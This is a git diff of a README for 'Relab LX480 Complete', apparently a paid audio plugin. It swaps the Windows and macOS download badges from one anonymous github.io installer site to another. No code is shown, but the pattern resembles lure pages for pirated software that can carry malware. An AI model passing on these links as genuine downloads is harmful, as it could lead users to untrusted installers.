@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Relab LX480 Complete](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RELAB_LX480_COMPLETE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Relab LX480 Complete](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RELAB_LX480_COMPLETE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Relab LX480 Complete** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-7C3AED?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-7C3AED?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-7C3AED?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-7C3AED?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
